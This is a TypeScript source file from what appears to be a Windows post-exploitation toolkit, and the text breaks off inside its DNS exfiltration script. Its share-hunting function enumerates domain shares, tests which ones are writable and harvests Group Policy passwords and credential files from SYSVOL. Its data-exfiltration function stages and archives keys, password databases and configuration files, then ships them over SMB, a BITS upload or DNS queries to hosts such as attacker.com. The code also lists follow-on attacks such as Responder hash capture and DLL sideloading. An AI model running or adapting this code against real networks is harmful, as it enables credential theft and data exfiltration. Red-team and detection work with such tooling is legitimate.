import { ps, cmd, wmic, run, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function shareHunt(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "enum"
  const target = argVal(args, "--target") || "domain"
  const depth = argVal(args, "--depth") || "1"
  const pattern = argVal(args, "--pattern")
  const findings: Finding[] = []
  const output: string[] = ["[*] Network share hunting...\n"]

  if ((activeExec === "cmd" || activeExec === "bat" || activeExec === "wmic") && (action === "enum" || action === "writable" || action === "hunt" || action === "sysvol")) {
    if (action === "enum" || action === "writable") {
      output.push("=== Share Enumeration (cmd.exe) ===\n")
      if (target === "domain") {
        const netView = await cmd("net view /domain 2>nul", timeout)
        output.push("[*] Domain computers via net view:")
        output.push(netView.stdout.trim())
        const netViewAll = await cmd("net view 2>nul", timeout)
        const hosts = (netViewAll.stdout.match(/\\\\(\S+)/g) || []).map((h) => h.replace(/\\\\/g, ""))
        output.push(`\n[*] Found ${hosts.length} hosts`)
        for (const host of hosts.slice(0, 20)) {
          const shares = await cmd(`net view \\\\${host} 2>nul`, timeout)
          if (shares.exitCode === 0) {
            output.push(`\n[+] ${host}:`)
            const shareLines = shares.stdout.split("\n").filter((l) => l.trim() && !l.includes("---") && !l.includes("Share name") && !l.includes("command completed"))
            for (const sl of shareLines) output.push(`    ${sl.trim()}`)
          }
        }
      } else {
        const shares = await cmd(`net view \\\\${target} 2>nul`, timeout)
        output.push(`[*] Shares on ${target}:`)
        output.push(shares.stdout.trim())
        if (action === "writable") {
          const shareNames = (shares.stdout.match(/^(\S+)\s+Disk/gm) || []).map((m) => m.split(/\s/)[0])
          for (const s of shareNames) {
            const testDir = await cmd(`dir \\\\${target}\\${s} 2>nul`, timeout)
            const writable = testDir.exitCode === 0
            output.push(`    [${writable ? "ACCESSIBLE" : "NO ACCESS"}] \\\\${target}\\${s}`)
          }
        }
      }
      const localShares = await cmd("net share", timeout)
      output.push("\n=== Local Shares ===")
      output.push(localShares.stdout.trim())
      findings.push({ checkId: "WIN-SHARE-001", provider: "windows", severity: "info", status: "ENUMERATED", resource: `smb://${target}`, title: "Share enumeration via cmd.exe net view/share", details: "cmd.exe native share discovery", remediation: "Restrict share permissions." })
    }
    if (action === "hunt") {
      output.push("=== Sensitive File Hunt (cmd.exe) ===\n")
      const searchPath = target === "domain" ? "C:\\Users" : `\\\\${target}`
      const exts = ["*.kdbx", "*.pem", "*.pfx", "*.ppk", "*.rdp", "*.env", "web.config", "*.bak", "*.sql"]
      for (const ext of exts) {
        const found = await cmd(`dir /s /b "${searchPath}\\${ext}" 2>nul`, timeout)
        if (found.stdout.trim()) {
          const files = found.stdout.trim().split("\n").filter(Boolean)
          output.push(`[!] ${ext}: ${files.length} files`)
          for (const f of files.slice(0, 5)) output.push(`    ${f}`)
        }
      }
      const unattend = await cmd('dir /s /b C:\\*.xml 2>nul | findstr /i "unattend sysprep Groups"', timeout)
      if (unattend.stdout.trim()) {
        output.push(`\n[!] Deployment XML files:`)
        for (const f of unattend.stdout.trim().split("\n").slice(0, 10)) output.push(`    ${f}`)
      }
      findings.push({ checkId: "WIN-SHARE-003", provider: "windows", severity: "high", status: "ENUMERATED", resource: `smb://${target}/hunt`, title: "Sensitive file discovery via cmd.exe dir", details: "dir /s recursive search for credential files", remediation: "Remove sensitive files from accessible shares." })
    }
    if (action === "sysvol") {
      output.push("=== SYSVOL Harvest (cmd.exe) ===\n")
      const domain = await cmd("echo %USERDNSDOMAIN%", timeout)
      const domainName = domain.stdout.trim()
      const sysvolPath = `\\\\${domainName}\\SYSVOL\\${domainName}`
      const gppXml = await cmd(`dir /s /b "${sysvolPath}\\*.xml" 2>nul`, timeout)
      if (gppXml.stdout.trim()) {
        output.push("[!] GPP XML files found (may contain cpassword):")
        for (const f of gppXml.stdout.trim().split("\n").slice(0, 20)) output.push(`    ${f}`)
      }
      const scripts = await cmd(`dir /s /b "${sysvolPath}\\*.ps1" "${sysvolPath}\\*.bat" "${sysvolPath}\\*.cmd" "${sysvolPath}\\*.vbs" 2>nul`, timeout)
      if (scripts.stdout.trim()) {
        output.push(`\n[!] Login/logoff scripts:`)
        for (const f of scripts.stdout.trim().split("\n").slice(0, 20)) output.push(`    ${f}`)
      }
      const credsInScripts = await cmd(`findstr /s /i "password credential net use runas" "${sysvolPath}\\*.*" 2>nul`, timeout)
      if (credsInScripts.stdout.trim()) {
        output.push(`\n[!!!] Credential references in SYSVOL:`)
        for (const l of credsInScripts.stdout.trim().split("\n").slice(0, 15)) output.push(`    ${l.trim()}`)
      }
      findings.push({ checkId: "WIN-SHARE-004", provider: "windows", severity: "high", status: "ENUMERATED", resource: `smb://${domainName}/SYSVOL`, title: "SYSVOL harvest via cmd.exe", details: "GPP XML, scripts, credential references", remediation: "Remove GPP passwords (KB2962486). Audit SYSVOL scripts." })
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "enum") {
    const script = `
Write-Output "=== Network Share Enumeration ==="
Write-Output ""

$targets = @()
if ('${target}' -eq 'domain') {
    Write-Output "[*] Querying AD for domain computers..."
    try {
        $searcher = New-Object DirectoryServices.DirectorySearcher
        $searcher.Filter = '(&(objectCategory=computer)(operatingSystem=*server*))'
        $searcher.PropertiesToLoad.Add('dnshostname') | Out-Null
        $searcher.PropertiesToLoad.Add('operatingsystem') | Out-Null
        $searcher.PageSize = 200
        $results = $searcher.FindAll()
        foreach ($r in $results) {
            $hostname = $r.Properties['dnshostname'][0]
            if ($hostname) { $targets += $hostname }
        }
        Write-Output "[*] Found $($targets.Count) servers in domain"

        if ($targets.Count -eq 0) {
            $searcher.Filter = '(objectCategory=computer)'
            $results = $searcher.FindAll()
            foreach ($r in $results | Select-Object -First 50) {
                $hostname = $r.Properties['dnshostname'][0]
                if ($hostname) { $targets += $hostname }
            }
            Write-Output "[*] Fallback: found $($targets.Count) computers"
        }
    } catch {
        Write-Output "[-] AD query failed: $($_.Exception.Message)"
        Write-Output "[*] Trying net view..."
        $netview = net view 2>&1
        $targets = $netview | Where-Object { $_ -match '\\\\\\\\(\\S+)' } | ForEach-Object { $Matches[1] }
        Write-Output "[*] Found $($targets.Count) hosts via net view"
    }
} elseif ('${target}' -match '/') {
    Write-Output "[*] Scanning subnet: ${target}"
    $base = '${target}'.Split('/')[0].Split('.')[0..2] -join '.'
    1..254 | ForEach-Object {
        $ip = "$base.$_"
        if (Test-Connection $ip -Count 1 -Quiet -TimeoutSeconds 1) { $targets += $ip }
    }
    Write-Output "[*] Found $($targets.Count) live hosts"
} else {
    $targets = @('${target}')
}

Write-Output ""
$allShares = @()

foreach ($host_ in $targets | Select-Object -First 30) {
    try {
        $shares = Get-WmiObject Win32_Share -ComputerName $host_ -ErrorAction Stop | Where-Object { $_.Name -notmatch '\\$$' }
        if ($shares) {
            Write-Output "[+] $host_"
            foreach ($s in $shares) {
                $unc = "\\\\$host_\\$($s.Name)"
                $readable = Test-Path $unc -ErrorAction SilentlyContinue
                $writable = $false
                if ($readable) {
                    try {
                        $testFile = "$unc\\.cs-test-$(Get-Random)"
                        [IO.File]::WriteAllText($testFile, '')
                        Remove-Item $testFile -Force -ErrorAction SilentlyContinue
                        $writable = $true
                    } catch {}
                }
                $access = if ($writable) { 'READ/WRITE' } elseif ($readable) { 'READ' } else { 'NO ACCESS' }
                Write-Output "    [$access] $($s.Name) — $($s.Description) ($($s.Path))"
                $allShares += [PSCustomObject]@{ Host = $host_; Share = $s.Name; UNC = $unc; Access = $access }
            }
        }
    } catch {
        Write-Output "[-] $host_ — access denied or offline"
    }
}

Write-Output ""
$writableShares = $allShares | Where-Object { $_.Access -eq 'READ/WRITE' }
$readableShares = $allShares | Where-Object { $_.Access -eq 'READ' }
Write-Output "=== Summary ==="
Write-Output "[*] Total shares: $($allShares.Count)"
Write-Output "[*] Readable: $($readableShares.Count)"
Write-Output "[!] Writable: $($writableShares.Count)"
if ($writableShares) {
    Write-Output ""
    Write-Output "[!] WRITABLE SHARES (high-value for staging/persistence):"
    foreach ($w in $writableShares) { Write-Output "    $($w.UNC)" }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-SHARE-001",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: `smb://${target}`,
      title: "Network shares enumerated with access level assessment",
      details: r.stdout.substring(0, 500),
      remediation: "Restrict share permissions. Remove world-readable/writable shares. Audit share ACLs regularly.",
    })
  }

  if (action === "hunt") {
    const targetHost = target === "domain" ? "." : target
    const maxDepth = depth
    const extraPattern = pattern ? `,'${pattern}'` : ""
    const script = `
Write-Output "=== Sensitive File Hunt on Shares ==="
Write-Output ""

$sensitivePatterns = @(
    '*.kdbx','*.key','*.pem','*.pfx','*.p12','*.cer','*.crt',
    'id_rsa*','*.ppk','*.rdp',
    'web.config','appsettings*.json','*.env','.env*',
    '*password*','*credential*','*secret*','*cred*',
    'unattend*.xml','sysprep*.xml','Groups.xml','ScheduledTasks.xml',
    '*.sql','*.bak','*.mdb','*.accdb',
    '*.ps1','*.bat','*.cmd','*.vbs',
    '*.conf','*.cfg','*.ini','*.yml','*.yaml',
    'wp-config.php','config.php','database.yml','secrets.yml'${extraPattern}
)

$targets = @()
if ('${targetHost}' -eq '.') {
    $shares = Get-WmiObject Win32_Share -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '\\$$' }
    foreach ($s in $shares) { $targets += $s.Path }
    Write-Output "[*] Scanning local shares: $($targets.Count)"
} else {
    $shares = Get-WmiObject Win32_Share -ComputerName '${targetHost}' -ErrorAction SilentlyContinue | Where-Object { $_.Name -notmatch '\\$$' }
    foreach ($s in $shares) { $targets += "\\\\${targetHost}\\$($s.Name)" }
    Write-Output "[*] Scanning remote shares on ${targetHost}: $($targets.Count)"
}

$totalFinds = @()

foreach ($sharePath in $targets) {
    Write-Output ""
    Write-Output "[*] Scanning: $sharePath (depth: ${maxDepth})"

    foreach ($pat in $sensitivePatterns) {
        try {
            $found = Get-ChildItem $sharePath -Filter $pat -Recurse -File -Depth ${maxDepth} -ErrorAction SilentlyContinue | Select-Object -First 10
            foreach ($f in $found) {
                $sizeKB = [math]::Round($f.Length/1KB, 1)
                $category = switch -Regex ($f.Name) {
                    '\\.(kdbx|key|pem|pfx|p12|ppk)$' { 'CREDENTIAL/KEY' }
                    'password|credential|secret|cred' { 'PASSWORD FILE' }
                    '\\.(sql|bak|mdb|accdb)$' { 'DATABASE' }
                    'Groups\\.xml|ScheduledTasks\\.xml|unattend|sysprep' { 'GPP/SYSPREP' }
                    'web\\.config|appsettings|config\\.php|wp-config' { 'APP CONFIG' }
                    '\\.env' { 'ENV FILE' }
                    '\\.(ps1|bat|cmd|vbs)$' { 'SCRIPT' }
                    '\\.(rdp)$' { 'RDP FILE' }
                    default { 'CONFIG' }
                }
                Write-Output "    [!] [$category] $($f.FullName) ($sizeKB KB)"
                $totalFinds += [PSCustomObject]@{ Category = $category; Path = $f.FullName; Size = $f.Length }
            }
        } catch {}
    }
}

Write-Output ""
Write-Output "=== Hunt Summary ==="
Write-Output "[*] Total sensitive files: $($totalFinds.Count)"
$grouped = $totalFinds | Group-Object Category | Sort-Object Count -Descending
foreach ($g in $grouped) {
    Write-Output "    $($g.Name): $($g.Count) files"
}

$gppFiles = $totalFinds | Where-Object { $_.Category -eq 'GPP/SYSPREP' }
if ($gppFiles) {
    Write-Output ""
    Write-Output "[!!!] GPP/SYSPREP FILES FOUND — may contain cleartext passwords!"
    Write-Output "[*] Use: gpp-decrypt to extract cPassword values from Groups.xml"
}

$keyFiles = $totalFinds | Where-Object { $_.Category -eq 'CREDENTIAL/KEY' }
if ($keyFiles) {
    Write-Output ""
    Write-Output "[!!!] CREDENTIAL/KEY FILES FOUND — SSH keys, certificates, KeePass databases!"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-SHARE-002",
      provider: "windows",
      severity: r.stdout.includes("!!!") ? "critical" : "medium",
      status: "ENUMERATED",
      resource: `smb://${targetHost}/hunt`,
      title: "Sensitive file hunt across network shares",
      details: r.stdout.substring(0, 500),
      remediation: "Remove sensitive files from shares. Encrypt credentials. Audit share contents regularly.",
    })
  }

  if (action === "sysvol") {
    const script = `
Write-Output "=== SYSVOL / NETLOGON Credential Hunt ==="
Write-Output ""

$domain = (Get-WmiObject Win32_ComputerSystem).Domain
$dc = $env:LOGONSERVER -replace '\\\\',''
$sysvolPath = "\\\\$domain\\SYSVOL\\$domain"
$netlogonPath = "\\\\$domain\\NETLOGON"

Write-Output "[*] Domain: $domain"
Write-Output "[*] DC: $dc"
Write-Output "[*] SYSVOL: $sysvolPath"
Write-Output "[*] NETLOGON: $netlogonPath"
Write-Output ""

$credFinds = @()

Write-Output "=== Groups.xml (GPP Passwords) ==="
$gppFiles = Get-ChildItem $sysvolPath -Filter "Groups.xml" -Recurse -ErrorAction SilentlyContinue
foreach ($gpp in $gppFiles) {
    Write-Output "[!!!] $($gpp.FullName)"
    $content = Get-Content $gpp.FullName -ErrorAction SilentlyContinue
    $cpassword = $content | Select-String 'cpassword="([^"]+)"' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
    $username = $content | Select-String 'userName="([^"]+)"' -AllMatches | ForEach-Object { $_.Matches.Groups[1].Value }
    if ($cpassword) {
        Write-Output "    [!] cPassword FOUND: $cpassword"
        Write-Output "    [!] Username: $username"
        Write-Output "    [*] Decrypt with: gpp-decrypt '$cpassword'"
        $credFinds += "GPP:$username"
    }
}

Write-Output ""
Write-Output "=== ScheduledTasks.xml ==="
$taskFiles = Get-ChildItem $sysvolPath -Filter "ScheduledTasks.xml" -Recurse -ErrorAction SilentlyContinue
foreach ($tf in $taskFiles) {
    Write-Output "[!] $($tf.FullName)"
    $content = Get-Content $tf.FullName -ErrorAction SilentlyContinue
    if ($content -match 'cpassword') { Write-Output "    [!!!] Contains cPassword!" }
}

Write-Output ""
Write-Output "=== Scripts in SYSVOL/NETLOGON ==="
$scripts = @()
$scripts += Get-ChildItem $sysvolPath -Include '*.ps1','*.bat','*.cmd','*.vbs','*.wsf' -Recurse -ErrorAction SilentlyContinue
$scripts += Get-ChildItem $netlogonPath -Include '*.ps1','*.bat','*.cmd','*.vbs','*.wsf' -Recurse -ErrorAction SilentlyContinue

foreach ($s in $scripts | Select-Object -First 30) {
    Write-Output "[*] $($s.FullName)"
    $content = Get-Content $s.FullName -Raw -ErrorAction SilentlyContinue
    if ($content -match 'password|passwd|pwd|credential|secret|apikey|token') {
        Write-Output "    [!!!] Contains credential keywords!"
        $matches_ = $content | Select-String '(?i)(password|passwd|pwd|secret|apikey|token)\s*[=:]\s*[''"]?([^\s''"]+)' -AllMatches
        foreach ($m in $matches_.Matches | Select-Object -First 5) {
            Write-Output "    [!] $($m.Value)"
        }
        $credFinds += "Script:$($s.Name)"
    }
}

Write-Output ""
Write-Output "=== INI / XML / Config Files ==="
$configs = Get-ChildItem $sysvolPath -Include '*.ini','*.xml','*.conf','*.cfg' -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -notmatch 'Groups\\.xml|ScheduledTasks\\.xml|Registry\\.xml' }
foreach ($c in $configs | Select-Object -First 20) {
    $content = Get-Content $c.FullName -Raw -ErrorAction SilentlyContinue
    if ($content -match 'password|passwd|credential|secret') {
        Write-Output "[!] $($c.FullName) — contains credential keywords"
        $credFinds += "Config:$($c.Name)"
    }
}

Write-Output ""
Write-Output "=== Summary ==="
Write-Output "[*] GPP files found: $($gppFiles.Count)"
Write-Output "[*] Scripts found: $($scripts.Count)"
Write-Output "[*] Credential findings: $($credFinds.Count)"
if ($credFinds.Count -gt 0) {
    Write-Output ""
    Write-Output "[!!!] CREDENTIALS FOUND IN SYSVOL — IMMEDIATE WIN"
    foreach ($cf in $credFinds) { Write-Output "    $cf" }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-SHARE-003",
      provider: "windows",
      severity: r.stdout.includes("CREDENTIALS FOUND") ? "critical" : "medium",
      status: r.stdout.includes("CREDENTIALS FOUND") ? "VULNERABLE" : "CHECKED",
      resource: `smb://SYSVOL`,
      title: "SYSVOL/NETLOGON credential hunt — GPP passwords, scripts, configs",
      details: r.stdout.substring(0, 500),
      remediation:
        "Delete Groups.xml with cPassword. Remove plaintext credentials from SYSVOL scripts. Apply MS14-025 patch.",
    })
  }

  if (action === "writable") {
    const script = `
Write-Output "=== Writable Share Discovery ==="
Write-Output "[*] Finding writable shares for staging and persistence..."
Write-Output ""

$targets = @()
try {
    $searcher = New-Object DirectoryServices.DirectorySearcher
    $searcher.Filter = '(objectCategory=computer)'
    $searcher.PropertiesToLoad.Add('dnshostname') | Out-Null
    $searcher.PageSize = 200
    $results = $searcher.FindAll()
    foreach ($r in $results | Select-Object -First 50) {
        $hostname = $r.Properties['dnshostname'][0]
        if ($hostname) { $targets += $hostname }
    }
} catch {
    $targets = @($env:LOGONSERVER -replace '\\\\','')
}

Write-Output "[*] Checking $($targets.Count) hosts..."
Write-Output ""

$writableShares = @()

foreach ($host_ in $targets) {
    try {
        $shares = net view "\\\\$host_" 2>&1 | Where-Object { $_ -match '^(\\S+)\\s+Disk' }
        foreach ($line in $shares) {
            $shareName = ($line -split '\\s+')[0]
            $unc = "\\\\$host_\\$shareName"
            try {
                $testFile = "$unc\\.cs-write-test-$(Get-Random)"
                [IO.File]::WriteAllText($testFile, 'test')
                Remove-Item $testFile -Force -ErrorAction SilentlyContinue
                $fileCount = (Get-ChildItem $unc -ErrorAction SilentlyContinue | Measure-Object).Count
                Write-Output "[+] WRITABLE: $unc ($fileCount items)"
                $writableShares += [PSCustomObject]@{ UNC = $unc; Items = $fileCount }
            } catch {}
        }
    } catch {}
}

Write-Output ""
Write-Output "=== Writable Share Summary ==="
Write-Output "[*] Total writable: $($writableShares.Count)"

if ($writableShares) {
    Write-Output ""
    Write-Output "[*] Attack opportunities:"
    Write-Output "    1. Stage payloads for lateral movement"
    Write-Output "    2. Drop SCF/URL files for hash capture (Responder)"
    Write-Output "    3. Replace scripts for persistence"
    Write-Output "    4. Plant DLLs for sideloading on remote hosts"
    Write-Output ""
    foreach ($w in $writableShares) {
        Write-Output "    $($w.UNC) — $($w.Items) items"
    }
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-SHARE-004",
      provider: "windows",
      severity: r.stdout.includes("WRITABLE:") ? "high" : "info",
      status: r.stdout.includes("WRITABLE:") ? "VULNERABLE" : "CHECKED",
      resource: "smb://writable-shares",
      title: "Writable share discovery for staging and persistence",
      details: r.stdout.substring(0, 500),
      remediation:
        "Restrict write access on shares. Use NTFS + share-level permissions. Monitor for unexpected file drops.",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function dataExfil(args: string[], timeout: number): Promise<HookResult> {
  const action = argVal(args, "--action") || "discover"
  const target = argVal(args, "--target")
  const domain = argVal(args, "--domain")
  const url = argVal(args, "--url")
  const share = argVal(args, "--share")
  const listener = argVal(args, "--listener")
  const password = argVal(args, "--password") || "cyberstrike"
  const findings: Finding[] = []
  const output: string[] = ["[*] Data exfiltration operations...\n"]

  if (activeExec === "cmd" || activeExec === "bat") {
    if (action === "discover") {
      const searchPath = target || "C:\\Users"
      output.push(`=== Sensitive File Discovery (cmd.exe) === \n[*] Scanning: ${searchPath}\n`)
      const searches = [
        { exts: "*.kdbx *.key *.pem *.pfx *.p12 *.ppk", label: "Credential files" },
        { exts: "*.rdp *.vnc", label: "Remote access configs" },
        { exts: "*.sql *.bak *.mdb *.accdb", label: "Database files" },
        { exts: "*.env web.config appsettings.json", label: "App configs" },
        { exts: "*.docx *.xlsx *.pdf", label: "Documents (sample)" },
      ]
      for (const s of searches) {
        const extsArr = s.exts.split(" ")
        for (const ext of extsArr) {
          const r = await cmd(`dir /s /b "${searchPath}\\${ext}" 2>nul`, timeout)
          if (r.stdout.trim()) {
            const files = r.stdout.trim().split("\n").filter(Boolean)
            output.push(`[!] ${ext}: ${files.length} files`)
            for (const f of files.slice(0, 5)) output.push(`    ${f}`)
          }
        }
      }
      findings.push({ checkId: "WIN-EXFIL-001", provider: "windows", severity: "high", status: "DISCOVERED", resource: `file://${searchPath}`, title: "Sensitive file discovery via cmd.exe dir", details: "Recursive dir /s search for credential and config files", remediation: "Encrypt sensitive files. Use DLP." })
    }
    if (action === "stage") {
      const searchPath = target || "C:\\Users"
      const stageDir = `${process.env.TEMP || "C:\\Windows\\Temp"}\\cs-stage-${Date.now()}`
      output.push(`=== File Staging (cmd.exe) ===\n[*] Staging to: ${stageDir}\n`)
      await cmd(`mkdir "${stageDir}" 2>nul`, timeout)
      const exts = ["*.kdbx", "*.pem", "*.pfx", "*.ppk", "*.rdp", "*.env", "web.config"]
      for (const ext of exts) {
        await cmd(`for /r "${searchPath}" %f in (${ext}) do copy "%f" "${stageDir}\\" 2>nul`, timeout)
      }
      const compress = await cmd(`compact /c /s:"${stageDir}" 2>nul`, timeout)
      output.push("[+] Files staged and NTFS compressed")
      const makecab = await cmd(`makecab /d CabinetName1=staged.cab /d DiskDirectoryTemplate="${stageDir}" /f nul 2>nul`, timeout)
      output.push("[*] For CAB compression: makecab /d CabinetName1=output.cab <filelist>")
      output.push(`[*] For Base64 encoding: certutil -encode "${stageDir}\\file" "${stageDir}\\file.b64"`)
      findings.push({ checkId: "WIN-EXFIL-002", provider: "windows", severity: "high", status: "STAGED", resource: `file://${stageDir}`, title: "File staging via cmd.exe", details: `Staged to ${stageDir}`, remediation: "Monitor file copy operations to temp directories." })
    }
    if (action === "smb" && share) {
      output.push(`=== SMB Exfil (cmd.exe) ===`)
      const r = await cmd(`xcopy "${target}" "${share}\\" /s /e /y /q 2>nul || copy "${target}" "${share}\\" 2>nul`, timeout)
      output.push(r.exitCode === 0 ? `[+] Copied to ${share}` : `[!] Copy failed: ${r.stderr}`)
      findings.push({ checkId: "WIN-EXFIL-SMB", provider: "windows", severity: "high", status: "EXFILTRATED", resource: share, title: "SMB exfil via cmd.exe xcopy/copy", details: `${target} → ${share}`, remediation: "Monitor SMB write operations." })
    }
    if (action === "https" && url) {
      output.push("=== HTTPS Exfil (cmd.exe) ===")
      const b64 = await cmd(`certutil -encode "${target}" "%TEMP%\\cs-b64.txt" 2>nul`, timeout)
      if (b64.exitCode === 0) {
        output.push("[+] Base64 encoded via certutil")
        output.push(`[*] Upload: certutil -urlcache -split -f "${url}" (for download) or use bitsadmin for upload`)
        const bits = await cmd(`bitsadmin /create csupload && bitsadmin /addfile csupload "${target}" "${url}" && bitsadmin /setnotifycmdline csupload cmd.exe "/c del %TEMP%\\cs-b64.txt" && bitsadmin /resume csupload 2>nul`, timeout)
        output.push(bits.exitCode === 0 ? "[+] BITS upload job created" : "[*] BITS upload requires server support — use certutil + manual transfer")
      }
      findings.push({ checkId: "WIN-EXFIL-HTTPS", provider: "windows", severity: "high", status: "EXFILTRATED", resource: url, title: "HTTPS exfil via certutil/bitsadmin", details: `${target} → ${url}`, remediation: "Monitor certutil and bitsadmin usage." })
    }
    if (action === "dns" && domain) {
      output.push("=== DNS Exfil (cmd.exe) ===")
      output.push(`[*] DNS exfil target domain: ${domain}`)
      output.push("[*] cmd.exe DNS exfil uses certutil encode + nslookup queries")
      output.push(`[*] Manual: certutil -encode "${target}" encoded.txt && for /f %i in (encoded.txt) do nslookup %i.${domain}`)
      findings.push({ checkId: "WIN-EXFIL-DNS", provider: "windows", severity: "high", status: "GUIDANCE", resource: domain, title: "DNS exfil guidance for cmd.exe", details: "certutil encode + nslookup subdomain queries", remediation: "Monitor DNS query volume and entropy." })
    }
    if (action === "icmp" && listener) {
      output.push("=== ICMP Exfil (cmd.exe) ===")
      output.push("[!] ICMP data exfil not available via native cmd.exe")
      output.push("[*] Requires PowerShell or compiled binary")
      output.push(`[*] Alternative: certutil -encode + for /f with ping -p (not standard)`)
    }
    return { output: output.join("\n"), findings }
  }

  if (action === "discover") {
    const searchPath = target || "C:\\Users"
    const script = `
Write-Output "=== Sensitive Data Discovery ==="
Write-Output "[*] Scanning: ${searchPath}"
Write-Output ""

$patterns = @{
    'Credentials' = @('*.kdbx','*.key','*.pem','*.pfx','*.p12','*.cer','*.crt','id_rsa*','*.ppk','*.rdp','web.config','appsettings*.json','*.env','.env*','credentials*','*password*')
    'Documents' = @('*.docx','*.xlsx','*.pptx','*.pdf','*.odt')
    'Source Code' = @('*.cs','*.py','*.ps1','*.bat','*.cmd','*.vbs','*.js')
    'Database' = @('*.sql','*.sqlite','*.db','*.mdb','*.accdb','*.bak')
    'Archives' = @('*.zip','*.7z','*.rar','*.tar','*.gz')
    'Config' = @('*.xml','*.yml','*.yaml','*.ini','*.conf','*.cfg')
}

$totalSize = 0
$totalFiles = 0

foreach ($category in $patterns.Keys) {
    $categoryFiles = @()
    foreach ($pattern in $patterns[$category]) {
        $found = Get-ChildItem '${searchPath}' -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 20
        $categoryFiles += $found
    }

    if ($categoryFiles.Count -gt 0) {
        $catSize = ($categoryFiles | Measure-Object -Property Length -Sum).Sum
        $totalSize += $catSize
        $totalFiles += $categoryFiles.Count
        Write-Output "[!] $category ($($categoryFiles.Count) files, $([math]::Round($catSize/1KB, 1)) KB):"
        foreach ($f in $categoryFiles | Select-Object -First 10) {
            Write-Output "    $($f.FullName) ($([math]::Round($f.Length/1KB, 1)) KB)"
        }
        if ($categoryFiles.Count -gt 10) {
            Write-Output "    ... and $($categoryFiles.Count - 10) more"
        }
        Write-Output ""
    }
}

Write-Output "=== Summary ==="
Write-Output "[*] Total sensitive files: $totalFiles"
Write-Output "[*] Total size: $([math]::Round($totalSize/1MB, 2)) MB"
Write-Output ""

if ($totalSize -lt 1MB) {
    Write-Output "[*] Recommended exfil: DNS (small payload, covert)"
} elseif ($totalSize -lt 50MB) {
    Write-Output "[*] Recommended exfil: HTTPS (medium payload, fast)"
} else {
    Write-Output "[*] Recommended exfil: SMB staging (large payload, reliable)"
}
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EXFIL-001",
      provider: "windows",
      severity: "info",
      status: "ENUMERATED",
      resource: `filesystem://${searchPath}`,
      title: "Sensitive data discovery — files identified for potential exfiltration",
      details: r.stdout.substring(0, 500),
      remediation: "Classify and encrypt sensitive data. Monitor bulk file access patterns with DLP tools.",
    })
  }

  if (action === "stage") {
    const sourcePath = target || "C:\\Users"
    const script = `
Write-Output "=== Staging Data for Exfiltration ==="

$stagingDir = "$env:TEMP\\cs-staging-$(Get-Random -Minimum 1000 -Maximum 9999)"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null
Write-Output "[+] Staging directory: $stagingDir"

$sensitivePatterns = @('*.kdbx','*.key','*.pem','*.pfx','*.rdp','*.env','*password*','*.docx','*.xlsx','*.pdf','*.sql','*.bak','web.config','appsettings*.json')
$staged = @()

foreach ($pattern in $sensitivePatterns) {
    $files = Get-ChildItem '${sourcePath}' -Filter $pattern -Recurse -File -ErrorAction SilentlyContinue | Select-Object -First 5
    foreach ($f in $files) {
        Copy-Item $f.FullName -Destination $stagingDir -ErrorAction SilentlyContinue
        $staged += $f.FullName
    }
}

Write-Output "[*] Staged $($staged.Count) files"

$archivePath = "$env:TEMP\\cs-exfil-$(Get-Date -Format 'yyyyMMddHHmmss').zip"

try {
    Compress-Archive -Path "$stagingDir\\*" -DestinationPath $archivePath -Force -ErrorAction Stop
    $archiveSize = (Get-Item $archivePath).Length
    Write-Output "[+] Archive created: $archivePath ($([math]::Round($archiveSize/1KB, 1)) KB)"

    if ('${password}' -ne '') {
        Write-Output "[*] For encryption, use: 7z a -p'${password}' -mhe=on encrypted.7z $archivePath"
    }
} catch {
    Write-Output "[-] Compression failed: $($_.Exception.Message)"
}

Remove-Item $stagingDir -Recurse -Force -ErrorAction SilentlyContinue
Write-Output "[+] Staging directory cleaned"
Write-Output ""
Write-Output "[*] Next steps:"
Write-Output "    winhook data_exfil --action https --target $archivePath --url https://attacker.com/upload"
Write-Output "    winhook data_exfil --action smb --target $archivePath --share '\\\\attacker\\share'"
Write-Output "    winhook data_exfil --action dns --target $archivePath --domain exfil.attacker.com"
`
    const r = await ps(script, timeout)
    output.push(r.stdout)
    if (r.stderr) output.push(`[!] ${r.stderr}`)
    findings.push({
      checkId: "WIN-EXFIL-002",
      provider: "windows",
      severity: "high",
      status: "EXECUTED",
      resource: "filesystem://staging",
      title: "Sensitive files staged and compressed for exfiltration",
      details: r.stdout.substring(0, 500),
      remediation:
        "Monitor bulk file copy operations. DLP solutions should flag archive creation from sensitive directories.",
    })
  }

  if (action === "dns") {
    const targetFile = target || "C:\\Windows\\Temp\\cs-exfil.zip"
    const exfilDomain = domain || "exfil.attacker.com"
    const script = `
Write-Output "=== DNS Exfiltration ==="
Write-Output "[*] Target: ${targetFile}"
Write-Output "[*] Domain: ${exfilDomain}"
Write-Output ""

if (-not (Test-Path '${targetFile}')) {
    Write-Output "[-] File not found: ${targetFile}"
    Write-Output ""
    Write-Output "[*] DNS exfiltration technique:"
    Write-Output "    1. Read file bytes → Base32 encode (DNS-safe charset)"
    Write-Output "    2. Split into 63-byte labels (max DNS label length)"
    Write-Output "    3. Send as DNS queries: <chunk>.<seq>.<session>.${exfilDomain}"
    Write-Output "    4. Attacker DNS server reassembles from query log"
    Write-Output ""
    Write-Output "[*] Advantages:"
    Write-Output "    - DNS often allowed through firewalls"
